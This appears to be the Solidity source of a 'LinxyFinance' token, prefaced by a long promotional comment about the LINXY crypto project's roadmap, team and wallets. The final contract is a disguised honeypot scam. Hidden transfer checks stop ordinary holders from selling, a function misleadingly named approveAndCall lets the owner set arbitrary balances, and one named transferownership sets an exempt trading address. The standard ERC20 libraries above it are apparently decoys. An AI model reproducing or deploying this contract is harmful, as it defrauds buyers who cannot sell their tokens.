/*
Tokens LINXY
The term crypto token refers to a special virtual currency token or how cryptocurrencies are denominated. These tokens represent fungible and tradable assets or utilities that reside on their own blockchains. Crypto tokens are often used to fundraise for crowd sales, but they can also be used as a substitute for other things. These tokens are usually created, distributed, sold, and circulated through the standard initial coin offering (ICO) process, which involves a crowdfunding exercise to fund project development.








Road Map 




Q1 2022

●  Restructure Application.
●  Rename Project.
●  update social media and listed platforms.
●  Update website, white paper and Road Map.
●  Start Update.
●  Update code and add new nodes

Q2 2022

●  Create LINXY ID.
●  Create NODESH.
●  Create New PC Wallets.
●  Create new Android Wallet.
●  Publish extension wallet for Firefox and Chrome.
●  Make the creation of smart contracts available on the LINXY network.
●  Launch Tokenization Platform.



Q3 2022

●  Search partnerships with Exchange for acceptance of LINXY tokens in the market.
●  Expand partnerships with exchanges.
●  Start construction of the NFT LINXY platform.
●  Start building the LINXY Hub.
●  Start marketing to expand the community.

Q1 2023

●  Launch NFT LINXY platform.
●  Launch LINXY Hub.
●  Review code and update protocol.
●  Update Road Map with new goals and improvements.



Team

Anzhel Milenov
CEO & Founder

Developer. Managing projects in Europe and South Africa. IT Department Manager in AllBestIco.com


Ivo Dimitrov
Chief Advisor

Passionate entrepreneur, with great experience in the banking sector. Ivo has interests to large volumes of trade. Perfect organizer and supervisor.

Borislav Stoikov
BlockChain Architecture

Borislav is committed to helping leading banks integrate Blockchain technology into their systems. He is currently working at Big 4 Consultancy in London!


Encho Sharabov
Lawyer and consultant

Sharabov has a long practice in one of the most successful law firms in Sofia. He is part of our project and helps to ensure the lawfulness!


Tsvetelina Stefanova
Advisory board (pro-bono)

Tsveti is a young and ambitious business lady who corrects the bad decisions and shoots for the Moon!











Details Linxy Finance Ecossystem
Linxy Finance (LINXY) Cryptocurrency

The major project update will enable all project users to create smart contracts directly on the LINXY network, so tokens, Dapps and NFTs can be easily created quickly and cheaper than in other blockchains that offer the same service.

With the update the following products or services will be created:

IDLINXY (LINXY Digital Identity).
NodeSH (Node Secure HyperConnection).
Chain LINXY Platform.
LINXY Hub.
NFT LINXY platform.
IDLINXY (LINXY Digital Identity)

Use our IDLINXY app to store your coins, or manage your tokens all in a simple and super secure way.

When creating your account, you will save your private key and export mnemonic (secure words) and then you can access our Android, Web, Chrome or Firefox wallet.

For login the same process is used, use your safe words or private key if you are logged in or forget to login.

NodeSH (Node Secure HyperConnection)

NodeSH: used to interact with the blockchain in reading and writing, these will allow the execution of the Smart Contract and will keep the states of the Smart Contract itself within their database, based on the interactions and rules written within the code .
Virtual Machine: the virtual machine (VM2) allows you to execute “untrusted” code or host of the NodeSH and is the safe environment in which the code is executed. The Virtual Machine will have few, predefined, internal modules available and will be able to interact with the NodeSH database limited to its own sphere of competence.
Compiler: although Smart Contracts are written in Javascript, the compiler will allow you to translate certain predefined rules (such as reading and writing the database) into a native language capable of communicating with the NodeSH.
NodeSH Modules
And here we are at the most important part: the modules. Although we can continue to call them “Smart Contracts” in fact the platform allows you to create modules / extensions / whatever you prefer to call them for the NodeSH. These modules will then be enabled within the NodeSH and then maintained by one or more specific NodeSH. Here we come to the first point on our list of required features: scalability .

The modules are not natively included in all the NodeSH, but only in those that have the interest of maintaining them and therefore the interest in providing more or less computing power for their execution.

This means that a specific application can be maintained only by its creator or by all those interested in using it, this therefore means that the number of interested parties will grow with the increase in users and therefore the system will always have computing power available. to serve different users.

This type of approach has already been used in decentralized applications such as IPFS or Torrent.

Clock and automatism
The specific interaction with the NodeSH allows to solve another big problem encountered in other Smart Contracts platforms, namely the automatisms. While it is generally accepted that the smart contract “executes itself on the basis of specific rules”, this idea is drastically wrong.

Taking the example of Ethereum, a Smart Contract may possibly have “automatically” conditions such that if executed (and we repeat the if ), it will lead to a change of state within it.

This is because the Ethereum Virtual Machine does not have a real clock or a fundamental characteristic of all electronic machines and which allows to synchronize by means of a certain cycle . In computers, for example, it is calculated in Hertz (GHz) and defines the amount to perform operations that the computer can perform every second.

Clearly to extend the concept of clock to the blockchain we must abstract from the concept related to computers and think that the VM clock (i.e. the moment when the machine synchronizes) is the emission of a block, which in the LINXY network is about 1 minute .

This means that we can think of having our Smart Contract execute at least one operation every block, that is when a “cycle” has been concluded.

We have therefore created the basis for the automatisms, all Smart Contracts will be able to call the function onBlock and self-execute the code regardless of whether someone calls or does not call the Smart Contract itself!

Immutability and updatability
Speaking of blockchain and Smart Contract, we can only mention one of the fundamental characteristics that the code must have: immutability.

Immutability is guaranteed by the blockchain as the code is not directly executed from a file, but this file must first be loaded into an address, thanks to the techniques we know. The code executed by the VM and by the user is therefore well defined and static and we have the guarantee that the code has been published by its author thanks to a double signature process.


For trading these tokens we are still looking for partnerships with exchanges, but don’t worry our team has been thinking about various trading strategies for the tokens in our network.

Hope you enjoyed the post, we will create post about our new services to familiarize you with everything that is coming.

Until the next post!



How to Upgrade Your LINX Wallet to Linxy Finance


The new wallets version 1.7.0.0-LINXYProtocol have their data compatible with versions 1.6.0.0, but there were some changes in their directories, to fix it is simple:


1º STEP
Go to :

Windows: C:\Users\Username\AppData\Roaming\LINX
Mac: ~/Library/Application Support/LINX
Ubuntu: ~/.LINX (Usually located in the root folder or main directory of your VPS)

Rename .LINX to .LINXY, so it looks like this:
Windows: C:\Users\Username\AppData\Roaming\LINXY
Mac: ~/Library/Application Support/LINXY
Ubuntu: ~/.LINXY (Usually located in the root folder or main directory of your VPS)

2º STEP
Go to the directory and look for your LINX.conf file and rename it to LINXY.conf, the rest of the files can continue as is.

If you use the LINX.pid file it must also be renamed in your settings the system will create a new PID file with the name LINXY.pid and you need to rename it


LINXY Virtual Machine (LINXY VM)


This describes the functioning of the LINXY Virtual Machine, the reasons for its creation and the implementation in the context of the NodeSH that will allow you to create and execute “Smart Contracts” (software that are executed and that maintain a state within a decentralized network ) thus creating an indefinite number of new use cases.

Abstract
LINXY was born from a fork of PIVX and rests its blockchain foundations directly on the concepts of Bitcoin (being PIVX a fork of Dash, which in turn is a fork of Bitcoin). This means that within the LINXY blockchain there is no reference to the concept of Smart Contracts.

Although we strongly believe that decentralized applications do not largely need Smart Contracts on the other hand, we realize that there are many other applications that need to work with a strongly decentralized and highly scalable logic. That said, we started thinking about the possibility of allowing third party developers to use our “backend” technology, that is the NodeSH, without actually corrupting them or having to act directly inside the source code.

Up to now, all the applications that required to interact with an “additional” logic have had to create new projects that interact with the NodeSH, thus delegating the maintenance of particular logics to additional software.

After a careful analysis of the various existing Smart Contracts platforms, we tried to define the “qualities” that our system should have:

Scalability: the system must be highly scalable, guaranteeing stability in the use of the platform as its use increases.
Automatism: the system must be able to “self-execute” or perform certain actions in a totally automatic way.
Simplicity: the system must give the developer ease of development without having to learn new programming languages.
Updatability: the system must guarantee the updating of the software while maintaining its immutability.
We believe that the system designed can actually satisfy all the above requirements, in the next paragraphs we will explain how.

NodeSH, VM e compiler
At the basis of the functioning of the platform we have three entities:
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract LinxyFinance {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}